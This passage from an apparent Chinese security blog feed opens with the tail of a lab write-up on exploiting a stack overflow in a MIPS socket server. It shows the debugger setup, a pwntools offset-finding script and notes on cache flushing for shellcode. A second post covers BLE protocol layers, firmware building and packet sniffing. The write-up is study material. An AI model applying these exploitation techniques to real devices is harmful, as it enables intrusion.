1);</span><br><span class="line">  shutdown(v8, 2);</span><br><span class="line">  shutdown(fd, 2);</span><br><span class="line">  close(v8);</span><br><span class="line">  close(fd);</span><br><span class="line">  return 66;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仍然对于argc进行了限制 需要我们提供程序参数<br>接着建立了一个socket通信 使用AF_INET协议族 即ipv4 套接字类型为数据报套接字 传输协议默认使用ip<br>随后使用bzero清空了v15数组 该数组用于存储socket信息<br>我们输入的参数赋值于sa_data成员 同时经过了htons函数 由小端序变为大端序<br>这里充当的是端口 随后利用bind函数和指定的端口相连<br>接着调用listen函数等待指定的端口出现客户端连接 这里的程序充当服务端<br>accept函数用于接受客户端的请求<br>接受到的数据存放于v10数组<br>漏洞出现在sprintf函数中 可以造成栈溢出<br>显然 这里的攻击思路就是劫持程序执行流 使其跳转到我们写入的shellcode</p><p>首先还是要获取偏移</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-mipsel-static -L . -g 1234 ./pwnable/ShellCode_Required/socket_bof 9999</span><br></pre></td></tr></table></figure><p>先启动程序 程序的端口为1234 监听的端口为9999<br>随后gdb连接1234 断点打在read函数 调用exp脚本发送垃圾数据 断点打在赋值ra寄存器那边 得到偏移为0x240</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from systemd import*</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;mips&#x27;,endian=&#x27;little&#x27;,bits=32)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">io = remote(&quot;127.0.0.1&quot;,9999)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Send Me Bytes:&quot;)</span><br><span class="line">io.sendline(cyclic(0x300))</span><br></pre></td></tr></table></figure><p>按照原本的想法 直接打shellcode就行了 但是最后无法实现  查阅了其他师傅的博客<br>问题出在mips架构的缓存不一致性 这一概念该如何理解<br>对于cpu的cache缓存一定不陌生 L1 cache为了处理指令和数据 指令是只读 而数据是读写  为了提高读写效率 将其分为了两个cache I-cache(指令缓存) D-cache(数据缓存)<br>所以这里需要将我们写入的shellcode从D-cache刷新到I-cache<br>理解到这里 产生了一个疑问 为什么在stack_bof_02中 我们写入的shellcode不需要考虑到该问题 即可生效<br>对比二者的程序逻辑 最明显的不同在于stack_bof_02从指令行中读取参数 socket_bof利用socket来获取数据<br>猜测通过socket传输的数据存储在了D-cache中<br>那么如何把数据从D-cache刷新到I-cache 利用sleep函数<br>给予一定的时间 来让D-cache和I-cache二者同步</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>蓝牙协议学习</title>
    <link href="http://example.com/2023/11/17/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2023/11/17/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-11-17T04:17:39.000Z</published>
    <updated>2023-12-18T13:07:53.931Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近看到新出的星闪 有点兴趣 所以打算先从基础的蓝牙学起 顺便借此机会熟悉一下通讯以及协议相关的知识 本文用来记录关于蓝牙的一些研究 不做教学用途</p><h1 id="蓝牙是什么"><a href="#蓝牙是什么" class="headerlink" title="蓝牙是什么"></a>蓝牙是什么</h1><p>蓝牙(Bluetooth)是一种无线通讯技术标准 用来让固定设备(手机 电脑等)以及移动设备(耳机 鼠标等)在短距离之间交换数据 形成个人局域网(PNA)<br>其使用短波特高频 在2.4G到2.485G的ISM频段进行通讯<br>蓝牙技术分为BR&#x2F;EDR(基本速率&#x2F;增强数据率)和LE(低耗能)两种<br>前者是传统的蓝牙传输模式 拥有较高的传输速率 适用于需要较高宽带的应用 并且采用的是点对点的网络拓扑 即1对1通信<br>后者的功耗需求更低 提供了更快的连接 但是传输速率较小 适用于低功耗应用和设备 其采用点对点(1对1) 广播(1对多) 网格(多对多)等网络拓扑结构<br>二者是相互独立的传输模式 都有自己的协议栈和通讯方式 但是二者并非不可共存 我们称双模式设备为蓝牙双模设备<br>目前蓝牙由蓝牙技术联盟来负责维护技术标准 其并不负责制造蓝牙设备<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311171817663.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311171817663.png" alt="image.png"></a><br>上图为蓝牙各代版本的发展 自4.0以后 分为了BR&#x2F;EDR和LE两种模式<br>本文所要详细研究的BLE 并不等于蓝牙4.0 其只是4.0的一个部分</p><h1 id="低功耗蓝牙协议栈"><a href="#低功耗蓝牙协议栈" class="headerlink" title="低功耗蓝牙协议栈"></a>低功耗蓝牙协议栈</h1><p>先明白协议栈是一个什么东西<br>他是指网络通信中所有协议的一个集合  由多个层级组成<br>协议栈通常由三个部分组成 媒体 传输 应用<br>来看看TCP&#x2F;IP协议栈<br>其不仅包括TCP IP协议 还包括http ip dns tcp arp等协议<br>该协议有一个参考模型 所有的协议都归类到四个层级中 分别是链路层 网络层 传输层 应用层 每一层使用其下一层的协议来完成需求<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311171847386.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311171847386.png" alt="image.png"></a><br>具体的层级利用流程这里就不延申了 回到蓝牙协议栈 这里只介绍低功耗蓝牙BLE的协议栈<br>其也由三个部分组成 Host + HCI + Controller<br>主机(Host) 这部分由核心协议层(L2CAP、SM、ATT)和核心规范(GAP、GATT)构成<br>控制器(Controller) 分为Link Layer(链路层)和Physical Layer(物理层)<br>HCI 此部分定义了主机和控制器之间的通信标准 比如UART或者USB<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311291137757.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311291137757.png" alt="image.png"></a><br>接下来拆分各层进行概念的解析 更具体的深入随着后续的抓包分析进行</p><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>BLE的物理层定义了无线电接收器&#x2F;发射器如何编码和解码传输的数据 以及应用的无线电的其他参数<br>其在2.4G到2.485G的免授权频段工作 采用40个信道 每个信道间隔2MHZ<br>分为广播信道和数据信道两个部分 广播频道只占用3个信道 固定为最后三个信道 用于发现设备 初始化连接以及广播数据<br>建立连接的设备 必须在同一信道 同一时间上才能传输数据<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311172231870.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311172231870.png" alt="image.png"></a></p><h2 id="链路层"><a href="#链路层" class="headerlink" title="链路层"></a>链路层</h2><p>该部分参考《core_v5.3.pdf》中的Part B: Link Layer Specification章节 即2662页起<br>下载地址: <a href="https://www.bluetooth.com/zh-cn/specifications/specs/core-specification-5-3/">https://www.bluetooth.com/zh-cn/specifications/specs/core-specification-5-3/</a><br>链路层起到的作用很多 比如负责指定选择哪个射频通道进行通信 怎么确保数据的完整性 具体在哪个时间点把包发送出去等等 其是整个BLE协议栈的核心 不过链路层只负责数据的发送和接收 对于数据的解析则交给GAP和GATT</p><h3 id="射频状态"><a href="#射频状态" class="headerlink" title="射频状态"></a>射频状态</h3><p>共有五种射频状态 LL层可以控制设备处于这五种状态中的一种<br>待机 通告 扫描 初始化 连接<br>待机状态(Standby State) 此时既不发送数据 也不接收数据 设备此时最节能<br>通告状态(Advertising State) 处于此状态的设备称为”通告者” 会周期性的通过广播通道发送数据 可以由处于初始化状态以及扫描状态的设备接收到<br>扫描状态(Scanning State) 处于该状态的设备成为”扫描者” 可以通过广播通道接收数据<br>初始化状态(Initiating State) 与扫描状态相似 不过其只会监听特定设备的广播 并且在接收数据后 还会发起连接请求<br>连接状态(Connection State) 由通告状态和初始化状态自动切换 处于该状态的设备由两种角色 主设备和从设备</p><h3 id="数据包格式"><a href="#数据包格式" class="headerlink" title="数据包格式"></a>数据包格式</h3><p>在以往的学习过程中 复现过一个tddp报文的协议洞 同理 来看一下BLE的报文的基础格式<br>其包含4个字段 前导码 访问地址 协议数据单元(PDU) 循环冗余检验<br>在建立连接的过程中 使用广播通道(PDU) 传输数据用数据通道(PDU)<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311172257393.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311172257393.png" alt="image.png"></a><br>其中 广播报文和数据报文的格式也不一样<br>广播报头包括 广播报文类型(4字节) RFU(无实际作用 用来对齐字节 1字节) ChSel(无实际作用 用来对齐字节 1字节) TxAdd(发送地址类型 1字节) RxAdd(接收地址类型 1字节) Length(用来表示payload的长度 8字节)<br>数据报头包括 LLID(逻辑链路标识符 2字节)  NESN(下一个预期序列号 1字节) SN(序列号 1字节) MD(更多数据 1字节) CP(报文类型 4字节)RFU(保留 3字节) length(payload的长度 8字节) CTEinfo (连续音扩展 8字节)</p><h2 id="HCI层"><a href="#HCI层" class="headerlink" title="HCI层"></a>HCI层</h2><p>其为主机和控制器之间提供一组标准接口<br>主要的3个任务:<br>-将主机的命令下达给控制器<br>-控制器将事件传送给主机<br>-在连接通道上进行数据传输<br>这里的接口不单单指物理接口 也包括逻辑接口 逻辑接口定义了命令 事件 数据的封包格式 物理接口定义了主机和控制器之间如何传输数据</p><h2 id="L2CAP层"><a href="#L2CAP层" class="headerlink" title="L2CAP层"></a>L2CAP层</h2><p>该层功能较多 其支持数据的分割和重组 通道复用等等<br>其将PDU(协议数据单元)拆分成更小的片段 这样就可以在不同信道中传输 提高数据吞吐量以及更高的并发性<br>他允许低功耗蓝牙(BLE)在同一时间复用三条信道</p><h2 id="SM层"><a href="#SM层" class="headerlink" title="SM层"></a>SM层</h2><p>sm层的主要功能是负责ble连接建立 认证 解密等行为的安全性</p><h2 id="ATT层"><a href="#ATT层" class="headerlink" title="ATT层"></a>ATT层</h2><p>该层译文为数据交互协议<br>引入一个新概念 “属性”<br>可以认为一个属性就是一段数据 每一个属性都包含四个部分<br>1.句柄 用来标识属性的唯一<br>2.类型 用来存储属性的类型<br>3.值 用来存储属性的具体值<br>4.权限 用来规范执行操作的权限</p><h2 id="GATT层"><a href="#GATT层" class="headerlink" title="GATT层"></a>GATT层</h2><p>该层负责整合ATT层的属性 将其统筹为”服务”<br>一个BLE设备可以包含多个服务 一个服务可以包含多个特征 一个特征可以包含多个描述符<br>GATT用来规范特征中的内容</p><h2 id="GAP层"><a href="#GAP层" class="headerlink" title="GAP层"></a>GAP层</h2><p>该层定义了设备如何相互发现 连接 绑定以及描述了设备如何成为广播者和观察者<br>还定义了不同类型的地址来实现隐私性和可解析性<br>GAP有两个概念来定义设备的行为  模式和过程<br>模式指设备长时间进行的操作 例如广播模式 指设备正在进行广播 广播需要较长时间<br>过程指短时间内设备进行的操作 例如一个设备正在寻找广播 观察所需的时间较短<br>其一共定义了四个角色  广播者 观察者 外围设备 中央设备<br>这里区分是否外围的要素为 是否主动发起连接 主动的一方是中央设备</p><h1 id="BLE设备工作流程"><a href="#BLE设备工作流程" class="headerlink" title="BLE设备工作流程"></a>BLE设备工作流程</h1><h2 id="配对模式"><a href="#配对模式" class="headerlink" title="配对模式"></a>配对模式</h2><p>大体的流程分为<br>蓝牙启动-&gt;扫描设备-&gt;设备配对-&gt;数据传输<br>其中 蓝牙的设备配对可以分为四种<br>1.Numeric Comparison<br>配对双方都显示一个6位数字 用户核验数字一致后 即可配对成功<br>2.Just Works<br>用户看不到配对过程 主动发起连接即可配对 比如蓝牙耳机 开盖即可<br>3.Passkey Entry<br>与第一种较类似 不过是在配对目标(比如电脑)上输入本地设备上显示的6位数字<br>例如wallpaper手机端和电脑端的壁纸传输<br>4.Out of Band<br>通过其他途径交换配对信息 例如NTF</p><h2 id="配对认证"><a href="#配对认证" class="headerlink" title="配对认证"></a>配对认证</h2><p>蓝牙2.0协议之前确保配对过程安全的是凭借PIN码 PIN码长度可以为4到16位数字<br>在配对过程中 会根据PIN码来生成一个Linkkey 两个配对设备共享一个Linkkey 我们称这个行为为绑定 下次配对时 即可用Linkkey来认证<br>后续的协议凭借密钥交换来配对 分为生成初始密钥 生成链路密钥 双方认证三个过程</p><h3 id="生成初始密钥"><a href="#生成初始密钥" class="headerlink" title="生成初始密钥"></a>生成初始密钥</h3><p>首先引入几个概念 我们称提出通信要求的设备为主设备  被动进行通信的设备为从设备<br>初始密钥的长度为128bit 由k22算法生成 该算法需要三个参数<br>1.从设备的物理地址BR_ADDR 每一个蓝牙设备都会被分配一个唯一的48bit的BR_ADDR 主设备在生成密钥之前 通过询问的方式来获取从设备的蓝牙MAC地址<br>2.PIN码及其长度 PIN码是双方设备预先设定的<br>3.一个128bit的随机数 由主设备生成 以明文的方式发送给从设备<br>如果双方设备以上获取到三部分的值相同 因为采用的是相同的k22算法 所以生成的初始密钥(Kinit)也是一致的</p><h3 id="生成链路密钥"><a href="#生成链路密钥" class="headerlink" title="生成链路密钥"></a>生成链路密钥</h3><p>首先主设备生成128位随机数LK_RANDA 从设备也生成128位随机数LK_RANDB<br>主设备中 LK_RANDA和Kinit进行位比特逻辑异或运算 将结果发送给从设备<br>从设备中 LK_RANDB和Kinit进行位比特逻辑异或运算 将结果发送给主设备<br>此时主从设备中都具有相同的Kinit LK_RANDA LK_RANDB BR_ADDRA BR_ADDRB<br>此时利用E21算法将这些进行加密 并将结果异或得到Kab</p><h3 id="双方认证"><a href="#双方认证" class="headerlink" title="双方认证"></a>双方认证</h3><p>双方认证采用challenge-response方式<br>主设备A为应答方 从设备B为请求方<br>主设备A生成128bit的随机数AU_RANDA 以明文的形式传输给从设备B<br>双方利用E1算法 将各自得到的Kab AU_RANDA BD_ADDRB加密运算分别得到32位的SRESA和SRESB<br>B设备将SRESB发送给A A设备对比SRESA和SRESB 如果一致即认证通过<br>接下来交换双方的角色 重新进行一次认证</p><h1 id="烧录canokey固件"><a href="#烧录canokey固件" class="headerlink" title="烧录canokey固件"></a>烧录canokey固件</h1><p><strong>补:忙活了大半天 貌似这个固件不是用来搞蓝牙的…..被误导了  那就权当记录一下吧</strong><br>我买的蓝牙适配器是亿佰特E104-BT5040U 这一款是需要自己额外烧录固件才能使用的<br>那没办法了 接下来再学一手烧录固件<br>查阅了一些资料后 我选择CanoKey来刷入 <a href="https://github.com/canokeys/canokey-nrf52">https://github.com/canokeys/canokey-nrf52</a><br>首先需要确保前置工具配置完全</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Prerequisites: 先决条件：</span><br><span class="line"></span><br><span class="line">CMake &gt;= 3.18</span><br><span class="line">GNU ARM Embedded Toolchain, downloaded from ARM</span><br><span class="line">GNU ARM 嵌入式工具链，从 ARM 下载</span><br><span class="line">git (used to generate embedding version string)</span><br><span class="line">git（用于生成嵌入版本字符串）</span><br><span class="line">python3 (used to generate UF2 format DFU file)</span><br><span class="line">python3（用于生成UF2格式的DFU文件）</span><br></pre></td></tr></table></figure><p>其他应该都安装过 这里提供GNU ARM的安装方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install gcc-arm-none-eabi</span><br></pre></td></tr></table></figure><p>那么接下来开始编译固件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/canokeys/canokey-nrf52.git</span><br><span class="line">cd canokey-nrf52/</span><br><span class="line">git submodule update --init --recursive</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -DCROSS_COMPILE=/usr//bin/arm-none-eabi- \</span><br><span class="line">    -DCMAKE_TOOLCHAIN_FILE=../toolchain.cmake \</span><br><span class="line">    -DCMAKE_BUILD_TYPE=Release ..</span><br><span class="line">make canokey_flash.uf2</span><br></pre></td></tr></table></figure><p>执行cmake的时候会触发报错<br>照着报错信息下载nrf5_sdk_17.1.0_ddde560.zip(注意你购买的蓝牙适配器的芯片方案是否一致)<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311221349945.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311221349945.png" alt="image.png"></a><br>下载后解压到对应目录下即可<br>结果还是报错<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311221415162.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311221415162.png" alt="image.png"></a><br>于是换了一种思路</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/greenlsi/nrf5-sdk</span><br><span class="line">mv nrf5-sdk nRF5_SDK_17.1.0_ddde560</span><br></pre></td></tr></table></figure><p>然后再次执行cmake  成功<br>结果执行make的时候又报错了！！！！ 崩溃了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311221503589.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311221503589.png" alt="image.png"></a><br>在对应报错文件首行加入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from __future__ import print_function</span><br></pre></td></tr></table></figure><p>终于 经过了千辛万苦 我们得到了canokey_flash.uf2  canokey.hex两个文件<br>接下来就是烧录固件了<br>这里选择nrf connect <a href="https://www.nordicsemi.com/Products/Development-tools/nRF-Connect-for-Desktop/Download#infotabs">https://www.nordicsemi.com/Products/Development-tools/nRF-Connect-for-Desktop/Download#infotabs</a><br>安装后下载programmer<br>这里由于网络问题 导致直接在nrf connect中安装programmer失败<br>所以我们手动安装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd C:\Users\22346\.nrfconnect-apps\local</span><br><span class="line">git clone https://github.com/greenlsi/nrf5-sdk</span><br><span class="line">git checkout v4.0.0</span><br><span class="line">npm install</span><br><span class="line">npm run watch</span><br></pre></td></tr></table></figure><p>随后就可以成功利用programmer刷取固件了<br>直接把我们编译出来的canokey.hex拖入进去 点击write<br>接下来的部分是初始化</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install opensc pcscd pcsc-tools usbutils</span><br><span class="line">sudo pip3 install scriptor</span><br></pre></td></tr></table></figure><p>还有一个ccid 利用apt-get无法安装 在阿里云镜像站中找到了对应的安装包<br><a href="https://mirrors.aliyun.com/ubuntu/pool/universe/c/ccid/?spm=a2c6h.25603864.0.0.25adc813rsLGW7">https://mirrors.aliyun.com/ubuntu/pool/universe/c/ccid/?spm=a2c6h.25603864.0.0.25adc813rsLGW7</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar jxvf ccid_1.5.4.orig.tar.bz2</span><br><span class="line">cd ccid-1.5.4/</span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>编译过程中遇到的第一个报错<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311271040061.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311271040061.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install flex</span><br></pre></td></tr></table></figure><p>第二个报错<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311271041735.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311271041735.png" alt="image.png"></a><br>找到对应的包 <a href="https://launchpad.net/ubuntu/+source/pcsc-lite/2.0.1-1">https://launchpad.net/ubuntu/+source/pcsc-lite/2.0.1-1</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar jxvf pcsc-lite_2.0.1.orig.tar.bz2 pcsc-lite-2.0.1/</span><br><span class="line">cd pcsc-lite-2.0.1/</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>又遇到了报错<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311271046126.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311271046126.png" alt="image.png"></a><br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311271046736.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311271046736.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install libsystemd-dev libudev-dev</span><br></pre></td></tr></table></figure><p>还有报错 直接去提示的网址下载最新的安装包<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311271048311.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311271048311.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -xf polkit-121.tar.gz</span><br></pre></td></tr></table></figure><p>看了下说明文档 要用meson来编译安装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BUILD INSTRUCTIONS</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">**polkit** uses [meson build system](https://mesonbuild.com/) for configuration with *ninja* as backend and *gcc* as compiler.  </span><br><span class="line">To configure and compile your copy of polkit tarball, simply follow meson build instructions in the following manner:</span><br><span class="line">$ meson setup [[-D option]...] target_directory</span><br><span class="line">$ meson compile -C target_directory</span><br><span class="line"># meson install -C target_directory</span><br><span class="line"></span><br><span class="line">List of available configuration options can be obtained with `meson configure` command.</span><br></pre></td></tr></table></figure><p>接下来开始编译</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install meson</span><br><span class="line">sudo apt install aptitude</span><br><span class="line">sudo aptitude install duktape-dev</span><br><span class="line">sudo apt install libpam0g-dev</span><br><span class="line">sudo apt install libdbus-1-dev</span><br><span class="line">sudo apt install libpthread-stubs0-dev</span><br><span class="line">sudo apt install libgirepository1.0-dev</span><br><span class="line">meson setup ./polkit-v.121/</span><br><span class="line">meson complie</span><br><span class="line">cd  ./polkit-v.121/</span><br><span class="line">meson install</span><br></pre></td></tr></table></figure><p>然后我们回到pcsc-lite的编译 可以成功运行下去了<br>回到ccid的编译 又又又遇到报错了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311271111184.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311271111184.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install libusb-1.0-0-dev</span><br></pre></td></tr></table></figure><p>随后终于可以成功编译<br>接着将我们烧录好固件的蓝牙适配器接入电脑<br>使用lsusb查看是否检测到Clay Logic usb<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311271128961.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311271128961.png" alt="image.png"></a><br>(然后运行sudo pcsc_scan  发现还是一堆报错 忙活半天还是无法解决 最后还把虚拟机干坏了<br>于是选择更换了ubuntu22 编译ccid的时候几乎畅通无阻<br>重新运行lsusb 没有发现clay logic usb<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311271206767.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311271206767.png" alt="image.png"></a><br>点击vmware右下角的clay logic usb 点击和主机断开连接后<br>就可以检测到了<br>随后使用sudo pcsc_scan连接 切换另外一个终端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd canokey-nrf52/utils</span><br><span class="line">sudo ./device-config-init.sh &#x27;Canokeys Canokey [OpenPGP PIV OATH] (123456) 00 00&#x27;</span><br></pre></td></tr></table></figure><h1 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h1><p>这里我选择的设备是 E104-BT5032U 芯片采用的是nRF52832<br>首先安装wireshark 这里就不介绍了 注意要顺便装上usbPcap插件<br>根据产品提供的文档 下载对应的sniffer版本 <a href="https://www.ebyte.com/product-view-news.html?id=1745">https://www.ebyte.com/product-view-news.html?id=1745</a><br>将excap文件夹内的所有文件复制到wireshark的对应文件夹中<br>随后将Profile_nRF_Sniffer_Bluetooth_LE文件夹中的内容复制到wireshark的profiles中<br>随后将设备插入 此时应该能发现对应的接口<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311291721022.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311291721022.png" alt="image.png"></a><br>此外还需要打开 视图-&gt;接口工具栏-&gt;nRF sniffer for bluetooth<br>此举是为了便于我们选择设备<br>我们直接点击过滤器 此时接收到了大量的包 在刚刚打开的栏中 我们可以选择特定的设备接收<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311291938341.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311291938341.png" alt="image.png"></a><br>点开Device后 可以注意到前面的dBm<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311291938053.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311291938053.png" alt="image.png"></a><br>其是用来衡量蓝牙发送功率或者接收功率的对数单位<br>一个负数的dBm表示相对于一个毫瓦的参考功率而言的衰减<br>也就是说-80dBm的信号会强于-100dBm<br>由于抓包的地点选在了宿舍 为了减少其他学生的BLE设备带来的影响 这里在选用接口之前先对rssi进行限制<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311291951658.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311291951658.png" alt="image.png"></a><br>在开始接下来的操作之前 要明白所购买的E104-BT5032U到底是一个什么样的设备<br>在我刚开始 我一直误以为 是通过这个设备发送包来和主机通讯 然后我们使用wireshark来抓包<br>但是实际上 可以把其看作一个从设备 接收各个主设备的包 然后我们利用wireshark可以查看这些包<br>所以我们还需要在其他平台上对于wireshark所监听的设备 进行发包等操作<br>这样就可以通过wireshark来查看这些包的内容 从而达到我们更进一步分析的目的 至于想要搭建一个发包的设备  那就是后话了<br>这里我选择我的手机 REDMI K50PRO来进行抓包<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311292108088.jpg" title="Screenshot_2023-11-29-21-08-23-845_no.nordicsemi..jpg" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311292108088.jpg" alt="Screenshot_2023-11-29-21-08-23-845_no.nordicsemi..jpg"></a><br>这里先把理论知识来结合一下实际温习一遍<br>在上文的学习中 我们得知了一个设备包含多种服务 而服务包含多种特征 特征又包含多种属性<br>以上图举例 Generic Access就是一个服务 以及最后的Unknown Service也是<br>前者被识别出来了服务名字 说明其是一个官方定义的服务 而后者无法被识别说明是小米的私有服务 官方服务可以通过查询来获取其作用<br><a href="https://www.bluetooth.com/wp-content/uploads/Files/Specification/Assigned_Numbers.pdf?id=89">https://www.bluetooth.com/wp-content/uploads/Files/Specification/Assigned_Numbers.pdf?id=89</a><br>我们向手机发送请求 请求返回设备名称<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311292152051.jpg" title="Screenshot_2023-11-29-21-51-48-448_no.nordicsemi..jpg" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311292152051.jpg" alt="Screenshot_2023-11-29-21-51-48-448_no.nordicsemi..jpg"></a><br>来到wireshark 通过检索找到请求包以及返回包<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311292153115.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311292153115.png" alt="image.png"></a><br>先来看请求包 走的是物理通道<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311292215515.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311292215515.png" alt="image.png"></a><br>根据上文 其应该由前导码 访问地址 协议数据单元 循环冗余检验四个部分组成<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311301138474.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311301138474.png" alt="image.png"></a><br>图中黑框部分就是数据包 前面是nrf connect发包的一些参数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311301139780.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311301139780.png" alt="image.png"></a><br>前导码是一个01交替的固定序列 在LE 1M PHY上为8bit<br>LE 2M PHY上为16bit 二者是不同的物理层传输方式 区别在于传输速率<br>通常为0x55或者是0xaa 但是这里我并没有找到前导码 位于包头的是访问地址<br>这里查阅了文档也没提及这一点 观察了其他的LL层报文 